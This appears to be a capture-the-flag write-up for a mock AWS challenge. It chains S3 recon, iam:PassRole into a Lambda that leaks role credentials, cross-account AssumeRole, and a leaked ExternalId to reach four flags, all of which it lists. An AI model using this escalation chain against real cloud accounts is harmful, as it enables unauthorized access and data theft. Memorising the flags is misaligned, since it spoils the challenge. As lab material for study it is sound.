# Deputy — Cloud (Hard)

4 flags (in objective order):

```
recon       H7CTF{d6cc592f5a2f3db80718}
passrole    H7CTF{28f87391f8a228110839}
admin       H7CTF{ea3e1dba8012d76e2648}
externalid  H7CTF{1dbe909840d15aabdd63}
```

**Instance:** `https://web-d8f0b09a99a6a969.web.h7tex.com` · key given up front: `AKIAANALYST0000000000` (user `analyst`, account `111111111111`)

## Challenge

A partner called DeputyCorp integrates into our company. We are handed a low-privilege analyst key. We have to show how far an "absent-minded integration" can get: four flags, each stage one level deeper.

## Initial Analysis

The instance is a mock AWS running `Werkzeug/3.1.8`. Three things were pinned down with just a few requests:

| API surface | how it is called |
| --- | --- |
| STS + IAM | `POST /` with a form `Action=...&Version=...` (dispatcher keyed on `Action`) |
| S3 | `GET /<bucket>` and `GET /<bucket>/<key>` (path-style; the first segment is interpreted as the bucket name, visible in `NoSuchBucket: <segment>`) |
| Lambda | a real REST API: `GET|POST /2015-03-31/functions`, `POST /2015-03-31/functions/<name>/invocations` |

And the most important one: the mock does not check signatures. `Authorization: AWS4-HMAC-SHA256 Credential=AKIA.../us-east-1/iam/aws4_request, Signature=x` is enough; it only takes the access key id from the header and the session token from `X-Amz-Security-Token`, then applies that identity's inline policy. The host having no `boto3` is fine too: a hand-written 40-line client (`analysis/awsclient.py`).

Reading the policies is the key to the whole challenge. `ListPolicies`/`GetPolicyVersion` return empty because the mock only contains inline policies:

```
iam:ListUserPolicies(analyst)     -> ["analyst-permissions"]
iam:GetUserPolicy                 -> decodable policy document
iam:ListRolePolicies(ci-runner)   -> ["ci-runner-permissions"]
```

Those two documents spell out the entire route (full version in `de.md`): analyst has `iam:PassRole` scoped to `ci-runner-role` plus `lambda:CreateFunction|InvokeFunction`; `ci-runner-role` has `sts:AssumeRole` into `arn:aws:iam::999999999999:role/partner-admin-role`; the runner's trust policy only lets `lambda.amazonaws.com` assume it.

## Exploit Chain

### Stage 1  -  recon

`s3:ListAllMyBuckets` (`GET /`) lists 4 buckets: `deputy-analyst-scratch`, `deputy-runner-logs`, `deputy-flag-vault`, `deputy-crown-vault`. Analyst can only read the first bucket:

```
GET /deputy-analyst-scratch        -> <Key>welcome.txt</Key>
GET /deputy-analyst-scratch/welcome.txt
  Welcome, analyst.
  H7CTF{d6cc592f5a2f3db80718}
  Onboarding: our deploys run through a Lambda that executes as ci-runner-role.
```

### Stage 2  -  PassRole into a Lambda (classic "pass a role you cannot wear")

Analyst cannot `sts:AssumeRole` the runner (its trust policy only accepts the Lambda service), but does have `iam:PassRole` for exactly that ARN. Create a function carrying the role, then invoke it:

```
POST /2015-03-31/functions
  {"FunctionName":"deputy-relay","Role":"arn:aws:iam::111111111111:role/ci-runner-role",
   "Runtime":"python3.11","Handler":"lambda_function.lambda_handler","Code":{"ZipFile":"..."}}
-> 201
POST /2015-03-31/functions/deputy-relay/invocations
-> 200 {"message":"function executed; the execution role's environment credentials follow",
        "AWS_ACCESS_KEY_ID":"ASIA...","AWS_SECRET_ACCESS_KEY":"...","AWS_SESSION_TOKEN":"..."}
```

`GetCallerIdentity` with that credential set returns `arn:aws:sts::111111111111:assumed-role/ci-runner-role/awslambda-deputy-relay`. With this identity:

```
GET /deputy-runner-logs/build.log -> H7CTF{28f87391f8a228110839}
```

### Stage 3  -  AssumeRole into the partner account

The runner's policy allows it, and `partner-admin-role` requires no additional condition:

```
Action=AssumeRole RoleArn=arn:aws:iam::999999999999:role/partner-admin-role
  RoleSessionName=deputy-step        (>= 2 ký tự, nếu ngắn hơn mock trả ValidationError)
-> ASIA... / tok/...  (account 999999999999)
```

The admin creds open `deputy-flag-vault` (neither analyst nor the runner can):

```
GET /deputy-flag-vault        -> keys: flag, partner-config.json
s3://deputy-flag-vault/flag                 -> H7CTF{ea3e1dba8012d76e2648}
s3://deputy-flag-vault/partner-config.json  -> {"secure_role":"arn:aws:iam::999999999999:role/partner-secure-role",
                                                "external_id":"Dc-2026-8f31a97c4b2e"}
```

### Stage 4  -  confused-deputy control

`deputy-crown-vault` is still 403 for partner-admin. The `partner-secure-role` role is a "hardened" one: its trust policy requires `sts:ExternalId`. The mock distinguishes every failure clearly:

```
AssumeRole partner-secure-role                          -> 403 The trust policy requires an sts:ExternalId but none was provided.
AssumeRole ... ExternalId=wrong                         -> 403 The trust policy requires a matching sts:ExternalId.
AssumeRole ... ExternalId=Dc-2026-8f31a97c4b2e          -> 200 assumed-role/partner-secure-role/crown-step
```

With the final creds: `GET /deputy-crown-vault/flag` -> `H7CTF{1dbe909840d15aabdd63}`.

### Chain summary

```
user/analyst
  ├─ s3:GetObject(scratch)                -> cờ 1 (recon)
  ├─ iam:PassRole(ci-runner) + lambda:CreateFunction/Invoke
  │     -> chạy như ci-runner-role        -> cờ 2 (passrole)
  │        -> sts:AssumeRole(partner-admin-role, acct 999999999999)
  │                                        -> cờ 3 (admin)
  │           -> s3:GetObject(flag-vault) reads external_id
  │              -> sts:AssumeRole(partner-secure-role, ExternalId=...)
  │                                        -> cờ 4 (externalid)
```

## Result
```
$ python solve_deputy.py
[+] STAGE 1 recon: H7CTF{d6cc592f5a2f3db80718}
[+] STAGE 2 passrole: H7CTF{28f87391f8a228110839}
[+] STAGE 3 admin: H7CTF{ea3e1dba8012d76e2648}
[+] STAGE 4 externalid: H7CTF{1dbe909840d15aabdd63}
```

Rerun: `python solve_deputy.py` (needs `analysis/awsclient.py` next to it; writes `flags.txt`). A second run on the same instance will get `409` at the CreateFunction step because the function already exists; the invocation still reuses it, so the chain does not break.
